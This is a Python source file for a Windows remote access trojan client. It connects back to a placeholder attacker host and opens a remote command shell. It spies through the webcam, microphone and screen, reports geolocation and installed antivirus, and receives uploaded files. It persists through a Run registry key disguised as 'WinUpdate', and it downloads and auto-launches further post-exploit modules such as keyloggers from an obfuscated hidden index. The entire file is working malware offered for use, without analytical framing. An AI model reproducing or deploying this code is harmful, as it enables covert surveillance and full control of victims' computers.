import socket
import subprocess
import os
import sys
import struct
import simplejson
import shutil
import winreg
import platform
import wmi
import cv2
import requests
import sounddevice as sd
import wavio
import io
import json
import threading
import shlex
import shutil as shell_shutil
from PIL import ImageGrab
from plyer import notification
from cryptography.fernet import Fernet
from colorama import Fore, Style

KEY = 'RANDOM_KEY'

_k = KEY.encode() if isinstance(KEY, str) else KEY
fernet = Fernet(_k)

auth_code = 'authcode'

HOST = '__ipaddr__'
PORT = 12345

fileName = "app.exe"
use_app = False

time_value = 90

def encrypt(data): return fernet.encrypt(data)
def decrypt(data): return fernet.decrypt(data)

def json_receive(conn):
    json_data = ""
    try:
        json_data = json_data + recv_command(conn)
    except:pass
    return simplejson.loads(json_data)

def json_send(conn, data):
    json_data = simplejson.dumps(data)
    send_data(conn, json_data.encode("utf-8"))

def get_screenshot(conn):
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format='PNG')
    screenshot_bytes = screenshot_bytes.getvalue()
    send_data(conn, screenshot_bytes)

def send_notification(conn, title, message, app_name):
    try:
        notification.notify(title=title, message=message, app_name=app_name)
    except:pass

def get_system_info(conn):
    try:
        info = {
            "Platform": platform.system(),
            "Platform Release": platform.release(),
            "Platform Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "Processor": platform.processor(),
            "Python Build": platform.python_build(),
            "Python Version": platform.python_version()
        }
    except Exception as e:
        info = str(e)
    json_send(conn, info)

def get_security_info(conn):
    c = wmi.connect(namespace="root/SecurityCenter2")
    firewall = c.FirewallProduct()
    antivirus = c.AntiVirusProduct()
    firewall_info = [{"displayName": f.displayName, "instanceGuid": f.instanceGuid, 
                      "pathToSignedProductExe": f.pathToSignedProductExe , "pathToSignedReportingExe": f.pathToSignedReportingExe,
                      "productState": f.productState, "timestamp": f.timestamp} for f in firewall]
    antivirus_info = [{"displayName": a.displayName, "instanceGuid": a.instanceGuid, 
                      "pathToSignedProductExe": a.pathToSignedProductExe , "pathToSignedReportingExe": a.pathToSignedReportingExe,
                      "productState": a.productState, "timestamp": a.timestamp} for a in antivirus]
    json_send(conn, {"Firewall": firewall_info, "Antivirus": antivirus_info})

def del_persistence(conn):
    try:
        key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_ALL_ACCESS
    )
        winreg.DeleteValue(key, "WinUpdate")
        winreg.CloseKey(key)
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        os.remove(target)
        send_data(conn , b'completed')
    except:pass

def add_persistence(conn):
    try:
        target = os.path.join(os.environ["APPDATA"], "WinUpd.exe")
        if not os.path.exists(target):
            shutil.copyfile(sys.executable, target)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinUpdate", 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)
        send_data(conn, b'completed')
    except: pass

def send_data(conn, data: bytes):
    enc = encrypt(data)
    conn.sendall(struct.pack('>I', len(enc)))
    conn.sendall(enc)

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed while receiving data")
        data += chunk
    return data

def recv_command(conn, decode=True):
    try:
        size_data = recv_exact(conn, 4)
        size = struct.unpack('>I', size_data)[0]
        data = recv_exact(conn, size)
        dec = decrypt(data)
        return dec.decode() if decode else dec
    except Exception as e:
        print(e)
        raise


def handle_shell(conn):
    while True:
        try:
            data = recv_command(conn)
            if data == "exit":
                break
            elif data == "SHELLINFO":
                sendInput(conn)
            elif data.startswith("cd "):
                os.chdir(data[3:])
                send_data(conn, os.getcwd().encode())
            else:
                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout_value, stderr_value = proc.communicate()
                output = stdout_value + stderr_value
                if not output:
                    output = "<No output>\n"
                send_data(conn, output)
        except Exception as error:
            send_data(conn, f"[-] Error: {error}".encode())
def handle_mic(conn):
    try:
        duration = 5
        fs = 44100
        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        wav_file = io.BytesIO()
        wavio.write(wav_file, rec, fs, sampwidth=2)
        if wav_file.getvalue():
            send_data(conn, wav_file.getvalue())
    except:
        send_data(conn, b'Error')

def handle_upload(conn, getName=False):
    try: 
        file_name = recv_command(conn)
        print("file name" + file_name)
        send_data(conn, b'control')

        data = recv_command(conn, decode=False)
        with open(file_name, 'wb') as f:
            f.write(data)
        print("f writed")
        if getName: return file_name
    except Exception as error: print(error)

def handle_cam(conn):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, jpeg = cv2.imencode('.jpg', frame)
            send_data(conn, jpeg.tobytes())
        else:
            send_data(conn, b'[-] Failed')
    except: send_data(conn, b'[-] Error Take Photo')

def handle_geo(conn):
    try:
        r = requests.get('https://ipinfo.io/json')
        send_data(conn, r.text.encode())
    except: send_data(conn, b'[-] Failed To Get Location')

def run(filename):
    if getattr(sys, "frozen", False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    program_path = os.path.join(base_path, filename)
    if os.path.exists(program_path):
        try:
            os.system(f"start {program_path}")
        except:
            pass
def sendInput(conn):
    user = os.getlogin()
    cwd = os.getcwd()
    
    home = os.path.expanduser("~")
    display_path = cwd.replace(home, "~")

    prefix = f"{Fore.CYAN}{Style.BRIGHT}┌──({Fore.MAGENTA}Shadow{Fore.CYAN}@{Fore.WHITE}{user}{Fore.CYAN})"
    path_info = f"{Fore.CYAN}[{Fore.GREEN}{display_path}{Fore.CYAN}]"
    suffix = f"{Fore.CYAN}└─{Fore.RED}$ {Style.RESET_ALL}"

    value = f"{prefix}-{path_info}\n{suffix}"
    send_data(conn, value.encode())

def main():
    startup_executed = False
    while True:
        if not startup_executed:
            try:
                exploit.run_all_registered()
            except Exception:
                pass
            startup_executed = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            if recv_command(s) != auth_code: break
            send_data(s, b'UNSTAGED')
            while True:
                try:
                    cmd = recv_command(s)
                    print("CMD: " + cmd)
                    if cmd == "MODE_SHELL":
                        handle_shell(s)
                    elif cmd == "MODE_MIC":
                        handle_mic(s)
                    elif cmd == "MODE_UPLOAD":
                        handle_upload(s)
                    elif cmd == "MODE_CAM":
                        handle_cam(s)
                    elif cmd == "MODE_GEO":
                        handle_geo(s)
                    elif cmd == "MODE_REGISTER_POSTEXPLOIT":
                        handle_register_post_exploit(s)
                    elif cmd == "MODE_START_POSTEXPLOIT":
                        handle_start_post_exploit(s)
                    elif cmd == "MODE_BACKDOOR":
                        add_persistence(s)
                    elif cmd == "MODE_DEL":
                        del_persistence(s)
                    elif cmd == "MODE_NOTIFICATION":
                        notification_data = json_receive(s)
                        send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
                    elif cmd == "MODE_SCREENSHOT":
                        get_screenshot(s)
                    elif cmd == "MODE_SECINFO":
                        get_security_info(s)
                    elif cmd == "MODE_SYSINFO":
                        get_system_info(s)
                except ConnectionError: break
        except: pass

def download_post_exploit_command(conn):
    send_data(conn, b'control')
    path = handle_upload(conn, getName=True)
    print("path: " + str(path))
    
    if path and os.path.exists(path):
        file_name = os.path.basename(path)
        folder = _get_system_storage_dir()
        index_file = os.path.join(folder, file_name)
        
        os.makedirs(folder, exist_ok=True)
        
        try:
            shutil.copyfile(path, index_file)
        except Exception as e:
            print("Copy error: " + str(e))
            
        return index_file

def handle_register_post_exploit(conn):
    try:
        command_trigger = recv_command(conn)
        saved_path = download_post_exploit_command(conn)

        print(command_trigger)
        print(saved_path)

        if exploit.register_command(command_trigger, saved_path):
            started = exploit.execute_command(command_trigger)
            if started:
                send_data(conn, b'REGISTERED')
            else:
                send_data(conn, b'REGISTERED_BUT_NOT_STARTED')
        else:
            send_data(conn, b'FAILED')
        return saved_path
    except Exception as e:
        try:
            send_data(conn, ("FAILED: " + str(e)).encode())
        except Exception:
            pass
        return None
    
def handle_start_post_exploit(conn):
    try:
        command_trigger = recv_command(conn)
        started = exploit.execute_command(command_trigger)
        send_data(conn, b"CONTROLLER_STARTED" if started else b"CONTROLLER_FAILED")
        return started
    except Exception as e:
        try:
            send_data(conn, ("ERROR_CONTROLLER: " + str(e)).encode())
        except Exception:
            pass

def _get_system_storage_dir():
    """Return a cross-platform directory for hidden systemfiles storage."""
    if os.name == "nt":
        base = os.environ.get("APPDATA", os.path.expanduser("~"))
    else:
        base = os.environ.get("XDG_CONFIG_HOME", os.path.join(os.path.expanduser("~"), ".config"))
    return os.path.join(base, "systemfiles")


_INDEX_FILENAME = "secure_idx"
_XOR_KEY = 0x5A


def _xor_transform(data_bytes):
    return bytes(b ^ _XOR_KEY for b in data_bytes)


def _index_path():
    folder = _get_system_storage_dir()
    if not os.path.isdir(folder):
        try:
            os.makedirs(folder, exist_ok=True)
        except Exception:
            pass
    return os.path.join(folder, _INDEX_FILENAME)


def _read_index():
    path = _index_path()
    if not os.path.isfile(path):
        return {}
    try:
        with open(path, "rb") as fh:
            enc = fh.read()
        if not enc:
            return {}
        data = _xor_transform(enc)
        return json.loads(data.decode("utf-8"))
    except Exception:
        return {}


def _write_index(index_dict):
    try:
        data = json.dumps(index_dict, separators=(',', ':')).encode("utf-8")
        enc = _xor_transform(data)
        path = _index_path()
        with open(path, "wb") as fh:
            fh.write(enc)
        # attempt to tighten permissions on POSIX
        if os.name != "nt":
            try:
                os.chmod(path, 0o600)
            except Exception:
                pass
        return True
    except Exception as e:
        print(e)
        return False


class Exploit:
    """Compact secure executor for post-exploit modules on the agent side.

    Usage: from postexploit import exploit
           exploit.register_command('KEYLOGGER', 'C:/path/to/keylogger.py')
           exploit.execute_command('KEYLOGGER -arg1')
    """

    def register_command(self, command_trigger, downloaded_file_path):
        """Register or update a mapping from an uppercase command trigger to a file path.

        The mapping is stored encrypted on disk; plaintext never written to disk.
        """
        if not command_trigger or not downloaded_file_path:
            print("NOT COMMAND OR PATH")
            return False
        key = str(command_trigger).strip().upper()
        path = str(downloaded_file_path).strip()
        index = _read_index()
        index[key] = path
        return _write_index(index)

    def get_registered_target(self, command_trigger):
        if not command_trigger:
            return None
        target = _read_index().get(str(command_trigger).strip().upper())
        return target

    def list_registered_commands(self):
        return list(_read_index().keys())

    def _resolve_target_path(self, target_path):
        if not os.path.isabs(target_path):
            return os.path.abspath(os.path.join(_get_system_storage_dir(), target_path))
        return target_path

    def _launch_target(self, target_path, args_list=None):
        args_list = args_list or []
        target_path = self._resolve_target_path(target_path)
        if not os.path.exists(target_path):
            return False

        target_extension = os.path.splitext(target_path)[1].lower()
        is_python_script = target_extension in (".py", ".pyw")

        try:
            if os.name == "nt":
                if is_python_script:
                    python_executable = self._get_python_launcher()
                    if not python_executable:
                        return False
                    cmd = ['cmd', '/c', 'start', '', python_executable, target_path] + args_list
                else:
                    cmd = ['cmd', '/c', 'start', '', target_path] + args_list
                subprocess.Popen(cmd, shell=False)
            else:
                proc_args = ([sys.executable, target_path] if is_python_script else [target_path]) + args_list
                subprocess.Popen(proc_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            return True
        except Exception:
            return False

    def _get_python_launcher(self):
        if not getattr(sys, "frozen", False):
            return sys.executable
        for candidate in ("py", "python", "python3"):
            found = shell_shutil.which(candidate)
            if found:
                return found
        return None

    def execute_command(self, raw_command):
        """Execute a registered command trigger with optional trailing arguments.

        Returns True if execution was started, False otherwise.
        """
        if not raw_command:
            return False
        parts = raw_command.strip().split(" ", 1)
        trigger = parts[0].upper()
        args = parts[1] if len(parts) > 1 else ""

        index = _read_index()
        target_path = index.get(trigger)
        if not target_path:
            return False

        split_args = shlex.split(args) if args else []
        return self._launch_target(target_path, split_args)

    def run_all_registered(self):
        """Run all registered post-exploit modules asynchronously on startup."""
        index = _read_index()
        for target_path in index.values():
            if not target_path:
                continue
            thread = threading.Thread(target=self._launch_target, args=(target_path, []), daemon=True)
            thread.start()

exploit = Exploit()


if(use_app):
    run(filename=fileName)
if __name__ == "__main__":
    main()
